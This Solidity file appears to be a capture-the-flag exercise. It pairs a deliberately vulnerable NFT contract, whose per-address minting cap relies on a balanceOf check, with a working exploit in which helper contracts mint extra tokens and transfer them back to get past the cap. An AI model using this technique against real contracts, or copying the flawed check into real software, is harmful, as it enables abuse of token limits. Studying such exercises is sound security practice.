// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;

import "@openzeppelin/contracts/token/ERC721/ERC721.sol";

/**
 * @notice contract to exploit
 */
contract Overmint2 is ERC721 {
    using Address for address;

    uint256 public totalSupply;

    constructor() ERC721("Overmint2", "AT") {}

    function mint() external {
        require(balanceOf(msg.sender) <= 3, "max 3 NFTs");
        totalSupply++;
        _mint(msg.sender, totalSupply);
    }

    function success() external view returns (bool) {
        return balanceOf(msg.sender) == 5;
    }
}

/**
 * @notice The contract that uses the exploit.
 */
contract Offender {
    Overmint2 immutable _target;

    constructor(address target_) {
        _target = Overmint2(target_);
    }

    /**
     * @notice Circumvents the NFT restrictions by minting 3,
     *  and asking the conspirator to mint and transfer the remainder.
     */
    function circumvent() external {
        // mint three times
        _target.mint();
        _target.mint();
        _target.mint();
        // create a conspirator
        Conspirator c = new Conspirator(address(_target), address(this));
        // ask conspirator to mint and transfer 2 tokens
        c.requestToMintAndTransfer();
    }

    function wasSuccessful() external view returns (bool success) {
        return _target.success();
    }
}

/**
 * @notice Conspirator to the offending contract. Mints and transfers to the offender.
 */
contract Conspirator {
    address immutable _offender;
    Overmint2 immutable _target;

    modifier onlyOffender() {
        require(msg.sender == _offender, "request is not from offender");
        _;
    }

    constructor(address target_, address offender_) {
        _target = Overmint2(target_);
        _offender = offender_;
    }

    function requestToMintAndTransfer() external onlyOffender {
        _target.mint();
        _target.transferFrom(address(this), _offender, _target.totalSupply());
        _target.mint();
        _target.transferFrom(address(this), _offender, _target.totalSupply());
    }
}
